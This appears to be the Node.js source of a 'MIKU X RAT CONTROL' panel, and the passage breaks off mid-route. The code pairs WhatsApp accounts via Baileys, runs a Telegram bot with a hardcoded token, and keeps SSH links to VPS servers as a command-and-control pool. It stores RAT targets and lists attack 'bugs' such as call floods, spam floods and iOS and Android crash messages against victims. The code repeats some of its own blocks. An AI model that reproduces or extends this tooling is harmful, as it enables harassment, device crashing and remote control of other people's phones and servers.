const originalStdoutWrite = process.stdout.write.bind(process.stdout);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

// ── STARTUP: Generate pairId untuk semua user yang belum punya ───────────────
(function generateAllPairIds() {
  try {
    const db = loadDatabase();
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) {
        db[i].pairId = genPairId();
        changed = true;
        console.log(`[STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`);
      }
    }
    if (changed) {
      saveDatabase(db);
      console.log(`[STARTUP] pairId generation done for ${db.filter(u => u.pairId).length} users`);
    } else {
      console.log(`[STARTUP] All users already have pairId`);
    }
  } catch(e) {
    console.error('[STARTUP] pairId generation error:', e.message);
  }
})();

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
// ============================================
// IMPORT SEMUA MODULE DI AWAL
// ============================================
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const vm = require('vm');
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const { Client } = require('ssh2');

// ============================================
// KONSTANTA DAN VARIABEL GLOBAL
// ============================================
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const VPS_FILE = 'vps.json';
const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE = {};
const TOKEN = "8806109874:AAE_cOSkgFDECVXDivXnZi5VYo10Z3-HW2o";
const OWNER_ID = 1984511531;
const PORT = 5021;
const SESSION_PATH = path.join(__dirname, "permenmd");

// ============================================
// FUNGSI UTILITY
// ============================================
function loadDatabase() {
  try {
    if (!fs.existsSync(DB_PATH)) {
      fs.writeFileSync(DB_PATH, JSON.stringify([]));
      console.log("[🗃️ DB] Database baru dibuat.");
      return [];
    }
    const content = fs.readFileSync(DB_PATH, 'utf8');
    return content.trim() ? JSON.parse(content) : [];
  } catch (e) {
    console.error("[❌ DB] Error parsing database.json:", e.message);
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    return [];
  }
}

function saveDatabase(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error("[❌ DB] Error saving database:", e.message);
  }
}

function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

function genMsgId() {
  return Date.now().toString(36) + crypto.randomBytes(4).toString('hex');
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  if (!keyInfo) return null;
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

function isExpired(user) {
  if (!user || !user.expiredDate) return true;
  return new Date(user.expiredDate) < new Date();
}

function readRat(file) {
  try {
    if (fs.existsSync(file)) {
      const content = fs.readFileSync(file, 'utf8');
      return content.trim() ? JSON.parse(content) : [];
    }
    return [];
  } catch (e) {
    console.error(`[❌ RAT] Error reading ${file}:`, e.message);
    return [];
  }
}

function saveRat(file, data) {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error(`[❌ RAT] Error saving ${file}:`, e.message);
  }
}

function waiting(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

// ============================================
// SIMPAN ORIGINAL WRITE SEBELUM OVERRIDE
// ============================================
const originalStderrWrite = process.stderr.write.bind(process.stderr);

// ============================================
// PROCESS HANDLERS
// ============================================
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

// ============================================
// OVERRIDE STDOUT/STDERR UNTUK FILTER LOG
// ============================================
process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

// ============================================
// STARTUP: PAIR ID GENERATION
// ============================================
console.log("[STARTUP] Initializing...");

// Buat folder permenmd jika belum ada
if (!fs.existsSync('permenmd')) {
  fs.mkdirSync('permenmd', { recursive: true });
  console.log("[STARTUP] Created permenmd folder");
}

// Generate pairId untuk semua user
try {
  const db = loadDatabase();
  let changed = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      changed = true;
      console.log(`[STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`);
    }
  }
  if (changed) {
    saveDatabase(db);
    console.log(`[STARTUP] pairId generation done for ${db.filter(u => u.pairId).length} users`);
  } else {
    console.log(`[STARTUP] All users already have pairId`);
  }
} catch(e) {
  console.error('[STARTUP] pairId generation error:', e.message);
  console.error('[STARTUP] Stack trace:', e.stack);
}

// ============================================
// LOAD KEYLIST
// ============================================
let sikmanuk = [];
try {
  if (fs.existsSync("keyList.json")) {
    const content = fs.readFileSync("keyList.json", "utf8");
    sikmanuk = content.trim() ? JSON.parse(content) : [];
    console.log("✅ ActiveKeys loaded from keyList.json.");
  } else {
    console.log("⚠️ keyList.json not found, creating empty...");
    fs.writeFileSync("keyList.json", JSON.stringify([]));
    sikmanuk = [];
  }
} catch (err) {
  console.error("❌ Failed to load keyList.json:", err.message);
  console.error("❌ Creating new keyList.json...");
  fs.writeFileSync("keyList.json", JSON.stringify([]));
  sikmanuk = [];
}

// Watch keyList.json
try {
  fs.watchFile("keyList.json", () => {
    console.log("[📂] keyList.json changed, reloading...");
    try {
      const content = fs.readFileSync("keyList.json", "utf8");
      sikmanuk = content.trim() ? JSON.parse(content) : [];
    } catch (e) {
      console.error("[❌] Failed to reload keyList.json:", e.message);
    }
  });
} catch (e) {
  console.error("[❌] Failed to watch keyList.json:", e.message);
}

// ============================================
// LOAD CHAT
// ============================================
try {
  if (fs.existsSync(CHAT_FILE)) {
    const content = fs.readFileSync(CHAT_FILE, 'utf8');
    chatList = content.trim() ? JSON.parse(content) : [];
  } else {
    fs.writeFileSync(CHAT_FILE, JSON.stringify([]));
    chatList = [];
  }
  console.log('✅ Chat system initialized (Global + Private Chat)');
} catch (e) {
  console.error('❌ Failed to load chat file:', e.message);
  chatList = [];
  fs.writeFileSync(CHAT_FILE, JSON.stringify([]));
}

function saveChat() {
  try {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
  } catch (e) {
    console.error('❌ Failed to save chat:', e.message);
  }
}

// ============================================
// LOAD ACTIVE KEYS
// ============================================
try {
  if (fs.existsSync(KEY_FILE)) {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    if (rawData.trim()) {
      const parsed = JSON.parse(rawData);
      for (const user of parsed) {
        if (user.sessionKey && user.username && user.lastLogin) {
          const created = new Date(user.lastLogin).getTime();
          const expires = created + 10 * 60 * 1000;
          activeKeys[user.sessionKey] = {
            username: user.username,
            created,
            expires,
          };
        }
      }
      console.log("✅ activeKeys loaded from keyList.json.");
    }
  }
} catch (err) {
  console.error("❌ Failed to load keyList.json:", err.message);
}

// ============================================
// LOAD VPS
// ============================================
let vpsList = [];
let vpsConnections = {};
let cncActive = true;

try {
  if (fs.existsSync(VPS_FILE)) {
    const content = fs.readFileSync(VPS_FILE, 'utf8');
    vpsList = content.trim() ? JSON.parse(content) : [];
    console.log("📥 VPS list loaded.");
  } else {
    fs.writeFileSync(VPS_FILE, JSON.stringify([]));
    vpsList = [];
  }
} catch (e) {
  console.error("❌ Failed to load VPS list:", e.message);
  vpsList = [];
}

// ============================================
// GLOBAL CHAT & PRIVATE CHAT SYSTEM
// ============================================
const GLOBAL_CHAT_FILE = './global_chat.json';
const PRIVATE_CHAT_FILE = './private_chat.json';
const USER_PROFILES_FILE = './user_profiles.json';

function loadGlobalChat() {
  try {
    if (fs.existsSync(GLOBAL_CHAT_FILE)) {
      const content = fs.readFileSync(GLOBAL_CHAT_FILE, 'utf8');
      return content.trim() ? JSON.parse(content) : [];
    }
    return [];
  } catch { return []; }
}

function saveGlobalChat(data) {
  try {
    fs.writeFileSync(GLOBAL_CHAT_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('❌ Failed to save global chat:', e.message);
  }
}

function loadPrivateChat() {
  try {
    if (fs.existsSync(PRIVATE_CHAT_FILE)) {
      const content = fs.readFileSync(PRIVATE_CHAT_FILE, 'utf8');
      return content.trim() ? JSON.parse(content) : {};
    }
    return {};
  } catch { return {}; }
}

function savePrivateChat(data) {
  try {
    fs.writeFileSync(PRIVATE_CHAT_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('❌ Failed to save private chat:', e.message);
  }
}

function loadUserProfiles() {
  try {
    if (fs.existsSync(USER_PROFILES_FILE)) {
      const content = fs.readFileSync(USER_PROFILES_FILE, 'utf8');
      return content.trim() ? JSON.parse(content) : {};
    }
    return {};
  } catch { return {}; }
}

function saveUserProfiles(data) {
  try {
    fs.writeFileSync(USER_PROFILES_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('❌ Failed to save user profiles:', e.message);
  }
}

// ============================================
// BUGS LIST
// ============================================
const bugs = [
  { bug_id: "itil_gacor",   bug_name: "id gereja" },
  { bug_id: "matrix",       bug_name: "MATRIX PARALLEL" },
  { bug_id: "call_flood",   bug_name: "CALL FLOOD" },
  { bug_id: "flood",        bug_name: "FLOOD SPAM" },
  { bug_id: "crash_spam",   bug_name: "UIX" },
  { bug_id: "spam_call",    bug_name: "Prank Call" },
  { bug_id: "hard",         bug_name: "XKillers" },
  { bug_id: "cxinv",        bug_name: "CRASH INVIS" },
  { bug_id: "click",        bug_name: "CRASH CLICK" },
  { bug_id: "android",      bug_name: "CRASH UI" },
  { bug_id: "invisible",    bug_name: "DELAY INVISIBLE" },
  { bug_id: "ios_invis",    bug_name: "FC IOS INVISIBLE" },
  { bug_id: "ios_noinvis",  bug_name: "CRASH IOS" },
  { bug_id: "delay",        bug_name: "DELAY FC" },
];

// ============================================
// TQTO LIST
// ============================================
const tqto = [
  {
    name: "Miku Developer",
    status: "Developer",
    ppUrl: "https://i.ibb.co.com/RkvjHBHZ/file-00000000530481fa899d2d8e59af5daa.png",
    contac: "t.me/elmikudev"
  },
];

// ============================================
// NEWS
// ============================================
const news = [
  {
    image: "https://files.catbox.moe/aveyk3.jpg",
    title: "MIKU X RAT CONTROL",
    desc: "Developed By Miku"
  }
];

// ============================================
// AUTHENTICATION MIDDLEWARE
// ============================================
function authenticateChat(req, res, next) {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, error: 'Invalid session key' });
  }
  const db = loadDatabase();
  req.user = { 
    username: keyInfo.username, 
    role: db.find(u => u.username === keyInfo.username)?.role || 'member' 
  };
  next();
}

// ============================================
// RATE LIMITER
// ============================================
const rateLimitMap = {};

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

// ============================================
// FUNGSI KEYLIST
// ============================================
function loadKeyList() {
  try {
    if (fs.existsSync(KEY_FILE)) {
      const content = fs.readFileSync(KEY_FILE, 'utf8');
      return content.trim() ? JSON.parse(content) : [];
    }
    return [];
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  try {
    fs.writeFileSync(KEY_FILE, JSON.stringify(list, null, 2));
  } catch (e) {
    console.error('❌ Failed to save key list:', e.message);
  }
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

// ============================================
// DEVICE PERMS
// ============================================
const devicePermFile = './device_perms.json';

function loadDevicePerms() {
  try {
    if (fs.existsSync(devicePermFile)) {
      const content = fs.readFileSync(devicePermFile, 'utf8');
      return content.trim() ? JSON.parse(content) : {};
    }
  } catch(e) {}
  return {};
}

function saveDevicePerms(data) {
  try {
    fs.writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
  } catch(e) {
    console.error('❌ Failed to save device perms:', e.message);
  }
}

// ============================================
// PUBLIC SENDERS
// ============================================
const publicSenderSet = new Set();

try {
  if (fs.existsSync('./publicSenders.json')) {
    const content = fs.readFileSync('./publicSenders.json', 'utf8');
    const data = content.trim() ? JSON.parse(content) : [];
    data.forEach(item => publicSenderSet.add(item));
  }
} catch(e) {
  console.error('❌ Failed to load public senders:', e.message);
}

function savePublicSenders() {
  try {
    fs.writeFileSync('./publicSenders.json', JSON.stringify([...publicSenderSet]));
  } catch(e) {
    console.error('❌ Failed to save public senders:', e.message);
  }
}

// ============================================
// WHATSAPP CONNECTION
// ============================================
const activeConnections = {};
const biz = {};
const mess = {};

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeCreds.push({ sessionName: sessionName });
    }
  }
  return activeCreds;
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`;
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect?.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function startUserSessions() {
  try {
    if (!fs.existsSync('permenmd')) {
      fs.mkdirSync('permenmd', { recursive: true });
      console.log('[DEBUG] Created permenmd folder');
      return;
    }

    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => fs.lstatSync(p).isDirectory());

    console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

    for (const folder of subfolders) {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    }
  } catch (err) {
    console.error('[DEBUG] Error starting sessions:', err.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  
  try {
    const sessionDir = path.join('permenmd', owner, number);

    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
        if (!isLoggedOut) {
          console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
          await waiting(3000);
          await pairingWa(number, owner, attempt + 1);
        } else {
          delete activeConnections[number];
        }
      } else if (connection === "open") {
        activeConnections[number] = sock;
        const sourceCreds = path.join(sessionDir, 'creds.json');
        const destCreds = path.join('permenmd', owner, `${number}.json`);

        try {
          await waiting(3000);
          if (fs.existsSync(sourceCreds)) {
            const data = fs.readFileSync(sourceCreds);
            fs.writeFileSync(destCreds, data);
            console.log(`✅ Rewrote session to ${destCreds}`);
          }
        } catch (e) {
          console.error(`❌ Failed to rewrite creds: ${e.message}`);
        }
      }
    });

    return null;
  } catch (err) {
    console.error(`❌ Pairing error for ${number}:`, err.message);
    return false;
  }
}

// ============================================
// VPS FUNCTIONS
// ============================================
function connectToAllVPS() {
  if (!cncActive) return;
  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// ============================================
// EXPRESS APP SETUP
// ============================================
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

app.use(rateLimiter);

// ============================================
// TELEGRAM BOT SETUP
// ============================================
const bot = new TelegramBot(TOKEN, { polling: true });

function loadTelegramConfig() {
  try {
    const telegramDataPath = "telegram.json";
    if (!fs.existsSync(telegramDataPath)) {
      fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
    }
    const content = fs.readFileSync(telegramDataPath, 'utf8');
    return content.trim() ? JSON.parse(content) : { ownerList: [], userList: [] };
  } catch {
    return { ownerList: [], userList: [] };
  }
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;
  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];
  return requiredKeys.every(key => key in jsonData);
}

// ============================================
// ROUTES: CHAT
// ============================================
app.get('/chat/profile', authenticateChat, (req, res) => {
  const profiles = loadUserProfiles();
  const profile = profiles[req.user.username] || {
    username: req.user.username,
    name: req.user.username,
    avatar: null,
    bio: '',
    status: 'online'
  };
  res.json({ valid: true, profile });
});

app.post('/chat/profile', authenticateChat, (req, res) => {
  const { name, bio, avatar } = req.body;
  const profiles = loadUserProfiles();

  if (!profiles[req.user.username]) {
    profiles[req.user.username] = { username: req.user.username };
  }

  if (name) profiles[req.user.username].name = name.substring(0, 50);
  if (bio) profiles[req.user.username].bio = bio.substring(0, 200);
  if (avatar && avatar.startsWith('data:image')) {
    if (avatar.length > 300000) {
      return res.json({ valid: false, error: 'Avatar terlalu besar (max 200KB)' });
    }
    profiles[req.user.username].avatar = avatar;
  }

  saveUserProfiles(profiles);
  res.json({ valid: true, profile: profiles[req.user.username] });
});

app.get('/chat/global/messages', authenticateChat, (req, res) => {
  const { before, limit = 50 } = req.query;
  let messages = loadGlobalChat();

  if (before) {
    const beforeDate = new Date(before);
    messages = messages.filter(m => new Date(m.timestamp) < beforeDate);
  }

  messages = messages.slice(-Math.min(parseInt(limit), 100));

  const profiles = loadUserProfiles();
  const enriched = messages.map(msg => ({
    ...msg,
    senderProfile: profiles[msg.sender] || { username: msg.sender, name: msg.sender, avatar: null }
  }));

  res.json({ valid: true, messages: enriched.reverse() });
});

app.post('/chat/global/send', authenticateChat, async (req, res) => {
  const { message, type = 'text', media, replyTo } = req.body;

  if (!message && type === 'text') {
    return res.json({ valid: false, error: 'Message required' });
  }

  const now = Date.now();
  const userMessages = loadGlobalChat().filter(m =>
    m.sender === req.user.username && (now - new Date(m.timestamp).getTime()) < 10000
  );
  if (userMessages.length >= 10) {
    return res.json({ valid: false, error: 'Too many messages. Slow down!' });
  }

  const newMsg = {
    id: genMsgId(),
    sender: req.user.username,
    type: type,
    message: type === 'text' ? message.substring(0, 2000) : message,
    media: media || null,
    replyTo: replyTo || null,
    timestamp: new Date().toISOString(),
    role: req.user.role
  };

  const messages = loadGlobalChat();
  messages.push(newMsg);

  if (messages.length > 500) messages.splice(0, messages.length - 500);
  saveGlobalChat(messages);

  const profiles = loadUserProfiles();
  const broadcastMsg = {
    ...newMsg,
    senderProfile: profiles[req.user.username] || { username: req.user.username, name: req.user.username }
  };

  for (const [uname, wsc] of Object.entries(wsClients)) {
    if (wsc.readyState === WebSocket.OPEN) {
      wsc.send(JSON.stringify({ type: 'global_message', message: broadcastMsg }));
    }
  }

  res.json({ valid: true, message: newMsg });
});

app.delete('/chat/global/message/:id', authenticateChat, (req, res) => {
  const { id } = req.params;
  let messages = loadGlobalChat();
  const msgIndex = messages.findIndex(m => m.id === id);

  if (msgIndex === -1) return res.json({ valid: false, error: 'Message not found' });

  const msg = messages[msgIndex];
  const canDelete = req.user.role === 'owner' || req.user.role === 'admin' || msg.sender === req.user.username;

  if (!canDelete) return res.json({ valid: false, error: 'Not authorized' });

  messages.splice(msgIndex, 1);
  saveGlobalChat(messages);

  for (const [uname, wsc] of Object.entries(wsClients)) {
    if (wsc.readyState === WebSocket.OPEN) {
      wsc.send(JSON.stringify({ type: 'global_message_deleted', messageId: id }));
    }
  }

  res.json({ valid: true });
});

app.get('/chat/private/users', authenticateChat, (req, res) => {
  const privateChats = loadPrivateChat();
  const userSet = new Set();

  Object.keys(privateChats).forEach(key => {
    if (key.startsWith(`${req.user.username}_`)) {
      const other = key.replace(`${req.user.username}_`, '');
      userSet.add(other);
    }
    if (key.endsWith(`_${req.user.username}`)) {
      const other = key.replace(`_${req.user.username}`, '');
      userSet.add(other);
    }
  });

  const profiles = loadUserProfiles();
  const users = Array.from(userSet).map(u => ({
    username: u,
    profile: profiles[u] || { username: u, name: u, avatar: null },
    lastMessage: privateChats[`${req.user.username}_${u}`]?.slice(-1)[0] ||
                 privateChats[`${u}_${req.user.username}`]?.slice(-1)[0] || null
  }));

  res.json({ valid: true, users });
});

app.get('/chat/private/messages/:withUser', authenticateChat, (req, res) => {
  const { withUser } = req.params;
  const { before, limit = 50 } = req.query;

  const privateChats = loadPrivateChat();
  const chatKey1 = `${req.user.username}_${withUser}`;
  const chatKey2 = `${withUser}_${req.user.username}`;
  let messages = privateChats[chatKey1] || privateChats[chatKey2] || [];

  if (before) {
    const beforeDate = new Date(before);
    messages = messages.filter(m => new Date(m.timestamp) < beforeDate);
  }

  messages = messages.slice(-Math.min(parseInt(limit), 100));

  const profiles = loadUserProfiles();
  const enriched = messages.map(msg => ({
    ...msg,
    fromMe: msg.sender === req.user.username,
    senderProfile: profiles[msg.sender] || { username: msg.sender, name: msg.sender }
  }));

  res.json({ valid: true, messages: enriched });
});

app.post('/chat/private/send/:toUser', authenticateChat, async (req, res) => {
  const { toUser } = req.params;
  const { message, type = 'text', media, replyTo, encrypted } = req.body;

  if (!message && type === 'text') {
    return res.json({ valid: false, error: 'Message required' });
  }

  const db = loadDatabase();
  const targetExists = db.find(u => u.username === toUser);
  if (!targetExists) {
    return res.json({ valid: false, error: 'User not found' });
  }

  const now = Date.now();
  const privateChats = loadPrivateChat();
  const chatKey = `${req.user.username}_${toUser}`;
  const recentMsgs = (privateChats[chatKey] || []).filter(m =>
    (now - new Date(m.timestamp).getTime()) < 5000
  );
  if (recentMsgs.length >= 5) {
    return res.json({ valid: false, error: 'Slow down! Max 5 messages per 5 seconds' });
  }

  const newMsg = {
    id: genMsgId(),
    sender: req.user.username,
    receiver: toUser,
    type: type,
    message: type === 'text' ? message.substring(0, 2000) : message,
    media: media || null,
    replyTo: replyTo || null,
    encrypted: encrypted || false,
    timestamp: new Date().toISOString()
  };

  if (!privateChats[chatKey]) privateChats[chatKey] = [];
  privateChats[chatKey].push(newMsg);

  if (privateChats[chatKey].length > 500) privateChats[chatKey].splice(0, privateChats[chatKey].length - 500);
  savePrivateChat(privateChats);

  if (wsClients[toUser] && wsClients[toUser].readyState === WebSocket.OPEN) {
    const profiles = loadUserProfiles();
    wsClients[toUser].send(JSON.stringify({
      type: 'private_message',
      message: {
        ...newMsg,
        fromMe: false,
        senderProfile: profiles[req.user.username] || { username: req.user.username, name: req.user.username }
      }
    }));
  }

  res.json({ valid: true, message: newMsg });
});

app.delete('/chat/private/message/:id', authenticateChat, (req, res) => {
